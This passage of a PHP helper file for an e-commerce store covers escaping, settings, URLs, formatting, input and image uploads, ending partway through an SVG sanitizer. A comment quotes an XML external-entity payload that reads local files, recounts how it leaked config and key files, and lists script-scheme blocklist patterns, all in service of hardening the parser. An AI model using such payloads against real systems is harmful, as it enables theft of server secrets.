<?php
/**
 * ShopInnKart - Shared helper functions.
 *
 * Everything in here is used by the storefront, the API and the admin panel,
 * so keep it dependency-free and side-effect free.
 */

declare(strict_types=1);

require_once __DIR__ . '/icons.php';

// ===========================================================================
//  Output escaping
// ===========================================================================

/** Escape a value for HTML output. Use this on EVERY dynamic echo. */
function e($value): string
{
    if ($value === null) {
        return '';
    }
    return htmlspecialchars((string) $value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

/** Escape for use inside a JS string / data attribute. */
function e_attr($value): string
{
    return htmlspecialchars((string) $value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

/** Encode a value as JSON safe to embed in a <script> block. */
function e_json($value): string
{
    return json_encode(
        $value,
        JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT
    ) ?: '{}';
}

// ===========================================================================
//  Settings (cached per request)
// ===========================================================================

/**
 * Read a single admin setting. Falls back to $default when the key is
 * missing or the settings table is unavailable.
 */
function setting(string $key, $default = null)
{
    static $cache = null;

    // setting_save() bumps this so a write becomes visible to later reads in
    // the same request. Without it, code that saves a setting and then acts on
    // it keeps seeing the value from the start of the request.
    static $generation = -1;

    if ($cache === null || $generation !== settings_cache_generation()) {
        $cache = [];
        $generation = settings_cache_generation();
        try {
            $cache = Database::fetchPairs('SELECT `setting_key`, `setting_value` FROM `settings`');
        } catch (Throwable $e) {
            $cache = [];
        }
    }

    if (!array_key_exists($key, $cache) || $cache[$key] === null || $cache[$key] === '') {
        // An empty stored value still counts as "set" for text fields, but a
        // NULL/'' with a provided default is almost always meant to fall back.
        return array_key_exists($key, $cache) && $cache[$key] === '' && $default === null
            ? ''
            : $default;
    }

    return $cache[$key];
}

/** Boolean-typed setting read. */
function setting_bool(string $key, bool $default = false): bool
{
    $value = setting($key, $default ? '1' : '0');
    return in_array((string) $value, ['1', 'true', 'yes', 'on'], true);
}

/** Integer-typed setting read. */
function setting_int(string $key, int $default = 0): int
{
    $value = setting($key, (string) $default);
    return is_numeric($value) ? (int) $value : $default;
}

/** Float-typed setting read. */
function setting_float(string $key, float $default = 0.0): float
{
    $value = setting($key, (string) $default);
    return is_numeric($value) ? (float) $value : $default;
}

/** All settings in a group, keyed by setting_key. */
function settings_group(string $group): array
{
    try {
        return Database::fetchPairs(
            'SELECT `setting_key`, `setting_value` FROM `settings` WHERE `setting_group` = :g ORDER BY `sort_order`',
            ['g' => $group]
        );
    } catch (Throwable $e) {
        return [];
    }
}

/**
 * Version counter for setting()'s per-request read cache.
 * Incrementing it forces the next read to reload from the database.
 */
function settings_cache_generation(bool $bump = false): int
{
    static $generation = 0;

    if ($bump) {
        $generation++;
    }

    return $generation;
}

/** Persist a setting, creating the row if it does not exist yet. */
function setting_save(string $key, $value, string $group = 'general', string $type = 'text'): void
{
    $exists = Database::fetchColumn('SELECT `id` FROM `settings` WHERE `setting_key` = :k', ['k' => $key]);
    if ($exists) {
        Database::update('settings', ['setting_value' => $value], '`setting_key` = :k', ['k' => $key]);
    } else {
        Database::insert('settings', [
            'setting_group' => $group,
            'setting_key'   => $key,
            'setting_value' => $value,
            'setting_type'  => $type,
        ]);
    }

    settings_cache_generation(true);
}

// ===========================================================================
//  URLs
// ===========================================================================

/** Absolute URL for a path inside the application. */
function url(string $path = ''): string
{
    $path = ltrim($path, '/');
    return $path === '' ? SITE_URL . '/' : SITE_URL . '/' . $path;
}

/**
 * URL for a file under /assets, fingerprinted with the file's modification
 * time.
 *
 * Without the ?v= a returning visitor keeps whatever stylesheet or script the
 * browser cached on their last visit, so a deploy that changes the CSS simply
 * does not reach them until they hard-refresh. The mtime is stat'd once per
 * path per request.
 */
function asset(string $path): string
{
    $path = ltrim($path, '/');
    $url  = ASSET_URL . '/' . $path;

    static $versions = [];
    if (!array_key_exists($path, $versions)) {
        $file = ROOT_PATH . '/assets/' . $path;
        $versions[$path] = is_file($file) ? (string) filemtime($file) : null;
    }

    return $versions[$path] === null ? $url : $url . '?v=' . $versions[$path];
}

/** URL for a file under /admin. */
function admin_url(string $path = ''): string
{
    $path = ltrim($path, '/');
    return $path === '' ? ADMIN_URL . '/' : ADMIN_URL . '/' . $path;
}

/** URL for an API endpoint, e.g. api_url('cart/add.php'). */
function api_url(string $path): string
{
    return API_URL . '/' . ltrim($path, '/');
}

/**
 * Resolve an image path stored in the database (always root-relative,
 * e.g. "uploads/products/x.webp") into a usable URL, with a fallback.
 */
function img_url(?string $path, string $fallback = 'assets/images/placeholders/no-image.svg'): string
{
    $path = trim((string) $path);

    if ($path === '') {
        return url($fallback);
    }
    // Already absolute.
    if (preg_match('#^(https?:)?//#i', $path) === 1 || strpos($path, 'data:') === 0) {
        return $path;
    }

    $relative = ltrim($path, '/');
    if (is_file(ROOT_PATH . '/' . $relative)) {
        return url($relative);
    }

    return url($fallback);
}

/**
 * Render a complete, well-behaved <img>.
 *
 * Centralising this is what stops half the storefront shipping images without
 * dimensions (layout shift) or without lazy loading (wasted bandwidth). Pass
 * the stored path — resolution and fallback go through img_url().
 *
 * @param array $options width, height, alt, class, style, lazy (bool),
 *                       priority (bool — the LCP image), fallback, sizes,
 *                       srcset (array of [descriptor => path])
 */
function render_img(?string $path, array $options = []): string
{
    $fallback = $options['fallback'] ?? 'assets/images/placeholders/no-image.svg';
    $src = img_url($path, $fallback);

    $width  = isset($options['width'])  ? (int) $options['width']  : null;
    $height = isset($options['height']) ? $options['height'] : null;
    $alt    = (string) ($options['alt'] ?? '');
    $class  = (string) ($options['class'] ?? '');
    $style  = (string) ($options['style'] ?? '');
    $sizes  = (string) ($options['sizes'] ?? '');

    // The hero/LCP image must not be lazy — it is the thing we are waiting for.
    $priority = !empty($options['priority']);
    $lazy = $options['lazy'] ?? !$priority;

    $attrs = ['src="' . e_attr($src) . '"', 'alt="' . e_attr($alt) . '"'];

    if ($width !== null)  { $attrs[] = 'width="' . $width . '"'; }
    if ($height !== null) { $attrs[] = 'height="' . (int) $height . '"'; }
    if ($class !== '')    { $attrs[] = 'class="' . e_attr($class) . '"'; }
    if ($style !== '')    { $attrs[] = 'style="' . e_attr($style) . '"'; }

    // srcset is only meaningful for raster uploads; an SVG scales on its own.
    if (!empty($options['srcset']) && is_array($options['srcset'])) {
        $set = [];
        foreach ($options['srcset'] as $descriptor => $candidate) {
            $set[] = img_url($candidate, $fallback) . ' ' . $descriptor;
        }
        if ($set !== []) {
            $attrs[] = 'srcset="' . e_attr(implode(', ', $set)) . '"';
            $attrs[] = 'sizes="' . e_attr($sizes !== '' ? $sizes : '100vw') . '"';
        }
    } elseif ($sizes !== '') {
        $attrs[] = 'sizes="' . e_attr($sizes) . '"';
    }

    $attrs[] = $lazy ? 'loading="lazy"' : 'loading="eager"';
    $attrs[] = 'decoding="async"';
    if ($priority) {
        $attrs[] = 'fetchpriority="high"';
    }
    if ($alt === '') {
        $attrs[] = 'aria-hidden="true"';
    }

    return '<img ' . implode(' ', $attrs) . '>';
}

/**
 * Category artwork, with a fallback that still looks like a category tile
 * rather than the generic "no image" square.
 */
function category_image_url(?string $path): string
{
    return img_url($path, 'assets/images/placeholders/category-fallback.svg');
}

/** Pretty product URL. */
function product_url(string $slug): string
{
    return url('product/' . $slug);
}

/** Pretty category URL. */
function category_url(string $slug): string
{
    return url('category/' . $slug);
}

/** Pretty brand URL. */
function brand_url(string $slug): string
{
    return url('brand/' . $slug);
}

/** Pretty blog post URL. */
function blog_url(string $slug = ''): string
{
    return $slug === '' ? url('blog') : url('blog/' . $slug);
}

/** Pretty CMS page URL. */
function page_url(string $slug): string
{
    return url('page/' . $slug);
}

/** The current request URI, absolute. */
function current_url(): string
{
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    return $scheme . '://' . ($_SERVER['HTTP_HOST'] ?? SITE_DOMAIN) . ($_SERVER['REQUEST_URI'] ?? '/');
}

/**
 * Rebuild the current query string with some parameters replaced.
 * Passing null as a value removes that parameter.
 */
function url_with(array $params, ?string $base = null): string
{
    $query = $_GET;
    foreach ($params as $key => $value) {
        if ($value === null || $value === '') {
            unset($query[$key]);
        } else {
            $query[$key] = $value;
        }
    }
    $base = $base ?? strtok($_SERVER['REQUEST_URI'] ?? '/', '?');
    $qs = http_build_query($query);
    return $qs === '' ? $base : $base . '?' . $qs;
}

/** Send a redirect and stop. */
function redirect(string $url, int $status = 302): void
{
    if (!headers_sent()) {
        header('Location: ' . $url, true, $status);
    }
    exit;
}

/** Redirect back to the referring page, or to a fallback. */
function redirect_back(string $fallback = '/'): void
{
    $referer = $_SERVER['HTTP_REFERER'] ?? '';
    // Only follow same-host referers.
    if ($referer !== '' && parse_url($referer, PHP_URL_HOST) === ($_SERVER['HTTP_HOST'] ?? '')) {
        redirect($referer);
    }
    // Nearly every admin caller passes admin_url(), which is already absolute;
    // running that through url() again produced
    // "http://host/ecomweb/http://host/ecomweb/admin/..." in the Location
    // header, so a fallback only fired when the browser sent no usable referer
    // — and when it did fire it went nowhere.
    redirect(preg_match('#^(https?:)?//#i', $fallback) === 1 ? $fallback : url($fallback));
}

// ===========================================================================
//  Money & numbers
// ===========================================================================

/**
 * Format an amount in the store currency.
 * Indian grouping puts the first separator after 3 digits, then every 2:
 * 124999 -> 1,24,999
 */
function money($amount, bool $withSymbol = true, ?int $decimals = null): string
{
    $amount = (float) $amount;
    $symbol = (string) setting('currency_symbol', CURRENCY_SYMBOL);
    $grouping = (string) setting('number_grouping', 'indian');
    $decimals = $decimals ?? (fmod($amount, 1.0) === 0.0 ? 0 : 2);

    $formatted = $grouping === 'indian'
        ? format_indian_number($amount, $decimals)
        : number_format($amount, $decimals, '.', ',');

    if (!$withSymbol) {
        return $formatted;
    }

    return setting('currency_position', 'before') === 'after'
        ? $formatted . $symbol
        : $symbol . $formatted;
}

/** Indian digit grouping (lakh / crore style). */
function format_indian_number(float $amount, int $decimals = 0): string
{
    $negative = $amount < 0;
    $amount = abs($amount);

    $parts = explode('.', number_format($amount, $decimals, '.', ''));
    $integer = $parts[0];
    $fraction = $parts[1] ?? '';

    if (strlen($integer) > 3) {
        $last3 = substr($integer, -3);
        $rest = substr($integer, 0, -3);
        $rest = preg_replace('/\B(?=(\d{2})+(?!\d))/', ',', $rest);
        $integer = $rest . ',' . $last3;
    }

    $result = $integer . ($fraction !== '' ? '.' . $fraction : '');
    return ($negative ? '-' : '') . $result;
}

/** Percentage saved between MRP and selling price. */
function discount_percent($mrp, $price): int
{
    $mrp = (float) $mrp;
    $price = (float) $price;
    if ($mrp <= 0 || $price <= 0 || $price >= $mrp) {
        return 0;
    }
    return (int) round((($mrp - $price) / $mrp) * 100);
}

/** Round to 2dp the way money should be rounded. */
function money_round($amount): float
{
    return round((float) $amount, 2);
}

// ===========================================================================
//  Strings
// ===========================================================================

/** URL-safe slug. */
function slugify(string $text, string $separator = '-'): string
{
    $text = trim($text);
    $text = preg_replace('/[^\p{L}\p{Nd}]+/u', $separator, $text) ?? $text;
    $text = trim($text, $separator);
    $text = mb_strtolower($text, 'UTF-8');
    $text = preg_replace('/' . preg_quote($separator, '/') . '{2,}/', $separator, $text) ?? $text;
    return $text === '' ? 'item' : $text;
}

/**
 * Make a slug unique within a table by appending -2, -3 ...
 * $ignoreId lets you keep the current row's own slug while editing.
 */
function unique_slug(string $table, string $slug, ?int $ignoreId = null, string $column = 'slug'): string
{
    $allowedTables = [
        'products', 'categories', 'brands', 'pages', 'blog_posts', 'blog_categories', 'tags', 'vendors',
    ];
    if (!in_array($table, $allowedTables, true)) {
        throw new InvalidArgumentException('unique_slug: unsupported table ' . $table);
    }

    $base = $slug;
    $suffix = 1;
    while (true) {
        $sql = sprintf('SELECT `id` FROM `%s` WHERE `%s` = :slug', $table, $column);
        $params = ['slug' => $slug];
        if ($ignoreId !== null) {
            $sql .= ' AND `id` <> :id';
            $params['id'] = $ignoreId;
        }
        if (Database::fetchColumn($sql . ' LIMIT 1', $params) === null) {
            return $slug;
        }
        $suffix++;
        $slug = $base . '-' . $suffix;
    }
}

/** Truncate on a word boundary. */
function str_limit(?string $text, int $limit = 120, string $end = '…'): string
{
    $text = trim(strip_tags((string) $text));
    if (mb_strlen($text) <= $limit) {
        return $text;
    }
    $cut = mb_substr($text, 0, $limit);
    $lastSpace = mb_strrpos($cut, ' ');
    if ($lastSpace !== false && $lastSpace > $limit * 0.6) {
        $cut = mb_substr($cut, 0, $lastSpace);
    }
    return rtrim($cut, " ,.;:-") . $end;
}

/** "3 days ago" style relative time. */
function time_ago($datetime): string
{
    if (empty($datetime)) {
        return '';
    }
    $timestamp = is_numeric($datetime) ? (int) $datetime : strtotime((string) $datetime);
    if ($timestamp === false) {
        return '';
    }

    $diff = time() - $timestamp;
    if ($diff < 0) {
        return 'just now';
    }
    if ($diff < 60) {
        return 'just now';
    }

    $units = [
        31536000 => 'year',
        2592000  => 'month',
        604800   => 'week',
        86400    => 'day',
        3600     => 'hour',
        60       => 'minute',
    ];
    foreach ($units as $seconds => $label) {
        if ($diff >= $seconds) {
            $count = (int) floor($diff / $seconds);
            return $count . ' ' . $label . ($count > 1 ? 's' : '') . ' ago';
        }
    }
    return 'just now';
}

/** Format a stored datetime for display. */
function format_date($datetime, string $format = 'd M Y'): string
{
    if (empty($datetime)) {
        return '';
    }
    $timestamp = is_numeric($datetime) ? (int) $datetime : strtotime((string) $datetime);
    return $timestamp === false ? '' : date($format, $timestamp);
}

/** Format a stored datetime with time. */
function format_datetime($datetime, string $format = 'd M Y, g:i A'): string
{
    return format_date($datetime, $format);
}

/** Mask an email for public display: john@example.com -> jo****@example.com */
function mask_email(string $email): string
{
    $parts = explode('@', $email);
    if (count($parts) !== 2) {
        return $email;
    }
    $name = $parts[0];
    $visible = mb_substr($name, 0, min(2, mb_strlen($name)));
    return $visible . str_repeat('*', max(3, mb_strlen($name) - 2)) . '@' . $parts[1];
}

/** Initials for an avatar bubble. */
function initials(string $name): string
{
    $words = preg_split('/\s+/', trim($name)) ?: [];
    $first = mb_substr($words[0] ?? '', 0, 1);
    $second = count($words) > 1 ? mb_substr((string) end($words), 0, 1) : '';
    return mb_strtoupper($first . $second) ?: 'U';
}

// ===========================================================================
//  Request helpers
// ===========================================================================

function is_post(): bool
{
    return strtoupper($_SERVER['REQUEST_METHOD'] ?? 'GET') === 'POST';
}

function is_get(): bool
{
    return strtoupper($_SERVER['REQUEST_METHOD'] ?? 'GET') === 'GET';
}

function is_ajax(): bool
{
    return ($_SERVER['HTTP_X_REQUESTED_WITH'] ?? '') === 'XMLHttpRequest'
        || strpos($_SERVER['HTTP_ACCEPT'] ?? '', 'application/json') !== false;
}

/** Trimmed string from POST then GET. */
function input(string $key, $default = null)
{
    $value = $_POST[$key] ?? $_GET[$key] ?? $default;
    return is_string($value) ? trim($value) : $value;
}

function input_int(string $key, int $default = 0): int
{
    $value = input($key, null);
    return is_numeric($value) ? (int) $value : $default;
}

function input_float(string $key, float $default = 0.0): float
{
    $value = input($key, null);
    return is_numeric($value) ? (float) $value : $default;
}

/** Checkbox-style boolean. */
function input_bool(string $key): bool
{
    $value = input($key, null);
    return in_array((string) $value, ['1', 'on', 'true', 'yes'], true);
}

/** Array input, filtered to scalars. */
function input_array(string $key): array
{
    $value = $_POST[$key] ?? $_GET[$key] ?? [];
    if (!is_array($value)) {
        return $value === '' || $value === null ? [] : [$value];
    }
    return array_values(array_filter($value, 'is_scalar'));
}

/** Nested array access with dot notation. */
function array_get(array $array, string $key, $default = null)
{
    if (array_key_exists($key, $array)) {
        return $array[$key];
    }
    foreach (explode('.', $key) as $segment) {
        if (!is_array($array) || !array_key_exists($segment, $array)) {
            return $default;
        }
        $array = $array[$segment];
    }
    return $array;
}

/** Decode JSON without throwing; always returns an array. */
function json_decode_safe(?string $json, array $default = []): array
{
    if ($json === null || trim($json) === '') {
        return $default;
    }
    $decoded = json_decode($json, true);
    return is_array($decoded) ? $decoded : $default;
}

/**
 * The client's IP, capped to the column width.
 *
 * REMOTE_ADDR on its own is the edge server behind a CDN, which collapsed
 * every visitor into one rate-limit bucket and wrote Cloudflare's address into
 * login_history. resolve_client_ip() reads the forwarded headers instead - but
 * only when the machine that actually connected is a proxy the owner listed in
 * sec_trusted_proxies, because otherwise the header is attacker-supplied.
 */
function client_ip(): string
{
    static $ip = null;
    if ($ip !== null) {
        return $ip;
    }

    $remote = (string) ($_SERVER['REMOTE_ADDR'] ?? '');

    return $ip = substr(
        function_exists('resolve_client_ip') ? resolve_client_ip($remote) : $remote,
        0,
        45
    );
}

function user_agent(): string
{
    return substr((string) ($_SERVER['HTTP_USER_AGENT'] ?? ''), 0, 255);
}

/** Stable id for anonymous carts / compare lists. */
function session_key(): string
{
    if (session_status() !== PHP_SESSION_ACTIVE) {
        return '';
    }
    return session_id() ?: '';
}

// ===========================================================================
//  Flash messages & old input
// ===========================================================================

/** Queue a flash message for the next request. */
function flash(string $type, string $message): void
{
    $_SESSION['_flash'][] = ['type' => $type, 'message' => $message];
}

/** Pull and clear all queued flash messages. */
function flash_pull(): array
{
    $messages = $_SESSION['_flash'] ?? [];
    unset($_SESSION['_flash']);
    return $messages;
}

/** Remember submitted values so a failed form can be repopulated. */
function flash_old(array $data): void
{
    unset($data['password'], $data['password_confirmation'], $data[CSRF_TOKEN_NAME]);
    $_SESSION['_old'] = $data;
}

/** Read a remembered value. Cleared after the first read of the whole bag. */
function old(string $key, $default = '')
{
    return $_SESSION['_old'][$key] ?? $default;
}

function old_clear(): void
{
    unset($_SESSION['_old']);
}

/** Store field-level validation errors for the next render. */
function flash_errors(array $errors): void
{
    $_SESSION['_errors'] = $errors;
}

function errors_pull(): array
{
    $errors = $_SESSION['_errors'] ?? [];
    unset($_SESSION['_errors']);
    return $errors;
}

function error_for(array $errors, string $field): string
{
    return isset($errors[$field]) ? (string) $errors[$field] : '';
}

// ===========================================================================
//  Stock & rating presentation
// ===========================================================================

/** in_stock | low_stock | out_of_stock */
function stock_status(int $stock, ?int $threshold = null): string
{
    $threshold = $threshold ?? setting_int('low_stock_threshold', 5);
    if ($stock <= 0) {
        return STOCK_OUT;
    }
    return $stock <= $threshold ? STOCK_LOW : STOCK_IN;
}

function stock_label(int $stock, ?int $threshold = null): string
{
    return [
        STOCK_IN  => 'In Stock',
        STOCK_LOW => 'Only ' . $stock . ' left',
        STOCK_OUT => 'Out of Stock',
    ][stock_status($stock, $threshold)];
}

/**
 * Render a 5-star rating as inline SVG.
 * Half stars are approximated by a clipped overlay.
 */
function rating_stars(float $rating, string $size = 'w-3.5 h-3.5'): string
{
    $rating = max(0.0, min(5.0, $rating));
    $html = '<span class="sik-stars" aria-label="' . e(number_format($rating, 1)) . ' out of 5">';
    for ($i = 1; $i <= 5; $i++) {
        $fill = $rating >= $i ? 1.0 : max(0.0, min(1.0, $rating - ($i - 1)));
        $pct = (int) round($fill * 100);
        $html .= '<span class="sik-star" style="--fill:' . $pct . '%">' . icon('star', $size) . '</span>';
    }
    return $html . '</span>';
}

// ===========================================================================
//  Pagination
// ===========================================================================

/**
 * Build a pagination model. The view decides how to render it.
 *
 * @return array{current:int,last:int,total:int,per_page:int,from:int,to:int,pages:array<int|string>}
 */
function paginate(int $totalItems, int $perPage, int $currentPage, int $window = 2): array
{
    $perPage = max(1, $perPage);
    $last = max(1, (int) ceil($totalItems / $perPage));
    $current = max(1, min($currentPage, $last));

    $pages = [];
    $start = max(1, $current - $window);
    $end = min($last, $current + $window);

    if ($start > 1) {
        $pages[] = 1;
        if ($start > 2) {
            $pages[] = '…';
        }
    }
    for ($i = $start; $i <= $end; $i++) {
        $pages[] = $i;
    }
    if ($end < $last) {
        if ($end < $last - 1) {
            $pages[] = '…';
        }
        $pages[] = $last;
    }

    return [
        'current'  => $current,
        'last'     => $last,
        'total'    => $totalItems,
        'per_page' => $perPage,
        'offset'   => ($current - 1) * $perPage,
        'from'     => $totalItems === 0 ? 0 : (($current - 1) * $perPage) + 1,
        'to'       => min($current * $perPage, $totalItems),
        'pages'    => $pages,
    ];
}

// ===========================================================================
//  Device / visibility helpers (used by the widget system)
// ===========================================================================

/** Coarse device class from the user agent: mobile | tablet | desktop. */
function device_type(): string
{
    static $type = null;
    if ($type !== null) {
        return $type;
    }
    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

    if ($ua === '') {
        return $type = 'desktop';
    }
    if (preg_match('/ipad|tablet|playbook|silk|(android(?!.*mobile))/i', $ua) === 1) {
        return $type = 'tablet';
    }
    if (preg_match('/mobile|iphone|ipod|android|blackberry|opera mini|iemobile|windows phone/i', $ua) === 1) {
        return $type = 'mobile';
    }
    return $type = 'desktop';
}

/**
 * Should a widget/menu item/popup be shown, given its visibility rules?
 * Device filtering here is a progressive enhancement — CSS still handles
 * the responsive breakpoints, this just avoids querying data we won't use.
 */
function visibility_allows(array $row): bool
{
    $device = $row['device_visibility'] ?? 'all';
    if ($device !== 'all') {
        $current = device_type();
        $allowed = [
            'desktop'        => ['desktop'],
            'tablet'         => ['tablet'],
            'mobile'         => ['mobile'],
            'desktop_tablet' => ['desktop', 'tablet'],
            'tablet_mobile'  => ['tablet', 'mobile'],
        ][$device] ?? null;

        if ($allowed !== null && !in_array($current, $allowed, true)) {
            return false;
        }
    }

    $auth = $row['auth_visibility'] ?? 'all';
    if ($auth === 'guest' && is_logged_in()) {
        return false;
    }
    if ($auth === 'user' && !is_logged_in()) {
        return false;
    }

    return schedule_is_live($row['start_date'] ?? null, $row['end_date'] ?? null);
}

/** True when "now" falls inside an optional start/end window. */
function schedule_is_live($start, $end): bool
{
    $now = time();
    if (!empty($start) && strtotime((string) $start) > $now) {
        return false;
    }
    if (!empty($end) && strtotime((string) $end) < $now) {
        return false;
    }
    return true;
}

/** Seconds remaining until a datetime, floored at zero. */
function seconds_until($datetime): int
{
    if (empty($datetime)) {
        return 0;
    }
    $target = strtotime((string) $datetime);
    return $target === false ? 0 : max(0, $target - time());
}

// ===========================================================================
//  Uploads
// ===========================================================================

/**
 * Validate and store an uploaded image.
 *
 * @param array  $file      One entry from $_FILES
 * @param string $subfolder Folder under /uploads, e.g. 'products'
 * @return array{ok:bool,path:?string,error:?string} path is root-relative
 */
function upload_image(array $file, string $subfolder = 'products'): array
{
    $fail = static fn (string $msg): array => ['ok' => false, 'path' => null, 'error' => $msg];

    if (!isset($file['error']) || is_array($file['error'])) {
        return $fail('Invalid upload.');
    }
    if ($file['error'] === UPLOAD_ERR_NO_FILE) {
        return $fail('No file was selected.');
    }
    if ($file['error'] !== UPLOAD_ERR_OK) {
        return $fail('Upload failed. Please try a smaller file.');
    }
    if (($file['size'] ?? 0) > MAX_UPLOAD_SIZE) {
        return $fail('File is larger than ' . (MAX_UPLOAD_SIZE / 1048576) . ' MB.');
    }
    if (!is_uploaded_file($file['tmp_name'])) {
        return $fail('Invalid upload source.');
    }

    $extension = strtolower(pathinfo((string) $file['name'], PATHINFO_EXTENSION));
    if (!in_array($extension, ALLOWED_IMAGE_EXTENSIONS, true)) {
        return $fail('Only ' . implode(', ', ALLOWED_IMAGE_EXTENSIONS) . ' files are allowed.');
    }

    // Trust the sniffed MIME type, not the browser-supplied one.
    $finfo = new finfo(FILEINFO_MIME_TYPE);
    $mime = (string) $finfo->file($file['tmp_name']);
    if (!in_array($mime, ALLOWED_IMAGE_MIMES, true)) {
        return $fail('That file is not a valid image.');
    }

    // Raster images must actually decode. SVG is text, so it is checked separately.
    $svgBody = null;
    if ($mime !== 'image/svg+xml') {
        $dimensions = @getimagesize($file['tmp_name']);
        if ($dimensions === false) {
            return $fail('That file is not a valid image.');
        }
    } else {
        // An SVG is a script host, and /uploads is same-origin, so anything that
        // survives here can run JavaScript with the site's cookies the moment
        // someone opens the file URL. The previous check was a regex blocklist
        // for <script/javascript:/onload/<foreignObject, which misses every
        // other event attribute (onmouseover, <animate onbegin>, ...) and any
        // entity-encoded variant. Rewrite the document from an allowlist
        // instead: what is not explicitly permitted does not survive.
        $svgBody = svg_sanitize((string) file_get_contents($file['tmp_name']));
        if ($svgBody === null) {
            return $fail('That SVG could not be read as a valid image.');
        }
    }

    $safeFolder = preg_replace('/[^a-z0-9_-]/i', '', $subfolder) ?: 'misc';
    $targetDir = UPLOAD_PATH . '/' . $safeFolder;
    if (!is_dir($targetDir) && !@mkdir($targetDir, 0775, true) && !is_dir($targetDir)) {
        return $fail('Upload folder is not writable.');
    }

    // Generated filename: never reuse anything the client supplied.
    $filename = date('Ymd') . '-' . bin2hex(random_bytes(8)) . '.' . $extension;
    $destination = $targetDir . '/' . $filename;

    if (!move_uploaded_file($file['tmp_name'], $destination)) {
        return $fail('Could not save the uploaded file.');
    }
    @chmod($destination, 0644);

    // Store the rewritten SVG, not the bytes the client sent.
    if ($svgBody !== null && file_put_contents($destination, $svgBody) === false) {
        @unlink($destination);
        return $fail('Could not save the uploaded file.');
    }

    return ['ok' => true, 'path' => 'uploads/' . $safeFolder . '/' . $filename, 'error' => null];
}

/**
 * Rewrite an SVG from an allowlist, dropping anything that can execute.
 *
 * Returns the cleaned markup, or null if the input is not parseable as SVG.
 * The approach is deliberately "rebuild", not "search and destroy": every
 * element and attribute has to be named here to survive, so a payload built
 * out of a tag or attribute nobody thought of is removed by default.
 */
function svg_sanitize(string $svg): ?string
{
    if (trim($svg) === '') {
        return null;
    }

    // Elements that can carry or trigger script, or pull in remote documents.
    static $allowedElements = [
        'svg', 'g', 'defs', 'symbol', 'use', 'title', 'desc', 'metadata',
        'path', 'rect', 'circle', 'ellipse', 'line', 'polyline', 'polygon',
        'text', 'tspan', 'textpath',
        'lineargradient', 'radialgradient', 'stop', 'pattern', 'clippath', 'mask',
        'filter', 'fegaussianblur', 'feoffset', 'feblend', 'femerge', 'femergenode',
        'fecolormatrix', 'fecomposite', 'feflood', 'marker',
    ];
    static $allowedAttributes = [
        'id', 'class', 'style', 'transform', 'viewbox', 'version', 'xmlns', 'xmlns:xlink',
        'width', 'height', 'x', 'y', 'x1', 'y1', 'x2', 'y2', 'cx', 'cy', 'r', 'rx', 'ry',
        'd', 'points', 'fill', 'fill-rule', 'fill-opacity', 'stroke', 'stroke-width',
        'stroke-linecap', 'stroke-linejoin', 'stroke-dasharray', 'stroke-dashoffset',
        'stroke-opacity', 'stroke-miterlimit', 'opacity', 'offset', 'stop-color',
        'stop-opacity', 'gradientunits', 'gradienttransform', 'patternunits',
        'clip-path', 'clip-rule', 'mask', 'filter', 'preserveaspectratio',
        'font-family', 'font-size', 'font-weight', 'text-anchor', 'dominant-baseline',
        'letter-spacing', 'marker-end', 'marker-start', 'marker-mid', 'stdderivation',
        'result', 'in', 'in2', 'mode', 'type', 'values', 'dx', 'dy', 'href', 'xlink:href',
    ];

    // An uploaded SVG is attacker-controlled XML, so the parser is locked down
    // before it sees a byte of it:
    //
    //   - no LIBXML_NOENT. That flag means "substitute entities", and it was
    //     doing exactly that: a <!DOCTYPE svg [<!ENTITY x SYSTEM "file:///...">]>
    //     had the named file read off disk and pasted into the document, where
    //     the scrub below happily kept it as <text> and the file was then served
    //     from /uploads. config/db.local.php and config/app.key.php went out
    //     that way. php://filter gave the source of any PHP file too.
    //   - a null external-entity loader, so even a libxml build that resolves
    //     entities on its own gets nothing back.
    //   - LIBXML_NONET keeps http(s) out, and LIBXML_DTDLOAD/DTDATTR stay off
    //     so no external DTD is fetched either.
    //
    // A document that declares a DOCTYPE at all is then refused outright: a
    // legitimate icon exported by Illustrator, Figma or Inkscape never needs
    // one, so there is nothing to lose and one whole class of parser tricks
    // (entity bombs included) never gets a second chance.
    // libxml_set_external_entity_loader() returns bool, not the old resolver,
    // before PHP 8.4 - so restoring means passing null (libxml's own default),
    // which is what every other parse in this codebase expects anyway.
    $previousLoader = function_exists('libxml_get_external_entity_loader') ? libxml_get_external_entity_loader() : null;
    libxml_set_external_entity_loader(static fn () => null);
    $previous = libxml_use_internal_errors(true);
    $doc = new DOMDocument();
    $loaded = $doc->loadXML($svg, LIBXML_NONET | LIBXML_NOERROR | LIBXML_NOWARNING);
    libxml_clear_errors();
    libxml_use_internal_errors($previous);
    libxml_set_external_entity_loader($previousLoader);

    if (!$loaded || $doc->documentElement === null
        || strtolower($doc->documentElement->nodeName) !== 'svg') {
        return null;
    }

    if ($doc->doctype !== null) {
        return null;
    }

    // Attribute filtering is its own step so it can be applied to the root <svg>
    // as well as to descendants — an onload= on the root element is the single
    // most common SVG payload, and scrubbing only children would sail past it.
    $scrubAttributes = static function (DOMElement $element) use ($allowedAttributes): void {
        foreach (iterator_to_array($element->attributes) as $attribute) {
            $name  = strtolower($attribute->nodeName);
            $value = $attribute->nodeValue ?? '';

            // Every on* handler goes, whatever it is called.
            if (!in_array($name, $allowedAttributes, true) || strpos($name, 'on') === 0) {
                $element->removeAttribute($attribute->nodeName);
                continue;
            }
            // href/style may be allowlisted but can still smuggle a URL scheme.
            $flat = strtolower(preg_replace('/\s+/', '', $value) ?? '');
            if (strpos($flat, 'javascript:') !== false
                || strpos($flat, 'data:text/html') !== false
                || strpos($flat, 'vbscript:') !== false
                || ($name === 'style' && strpos($flat, 'expression(') !== false)) {
                $element->removeAttribute($attribute->nodeName);
                continue;
            }
            // Local fragment references only — no remote document pulls.
            if (($name === 'href' || $name === 'xlink:href') && strpos($value, '#') !== 0) {
                $element->removeAttribute($attribute->nodeName);
            }
        }
    };

    $scrub = static function (DOMNode $node) use (&$scrub, $allowedElements, $scrubAttributes): void {
        foreach (iterator_to_array($node->childNodes) as $child) {
            if ($child instanceof DOMProcessingInstruction || $child instanceof DOMComment) {
                $node->removeChild($child);
                continue;
            }
            if (!$child instanceof DOMElement) {
                continue;
            }

